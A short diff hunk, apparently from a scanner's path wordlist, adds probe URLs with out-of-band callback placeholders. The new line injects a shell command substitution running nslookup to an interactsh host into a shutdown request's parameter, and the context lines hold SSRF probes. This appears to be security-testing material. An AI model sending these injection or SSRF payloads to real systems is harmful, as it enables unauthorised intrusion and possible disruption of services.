@@ -103,3 +103,4 @@
 /auth
 /api/public/stream?url=http://{{interactsh-url}}/x.mp4
 /public/stream?url=http://{{interactsh-url}}/x.mp4
+/rc/?command=shutdown&param=$(nslookup+{{randstr}}.{{interactsh-url}})
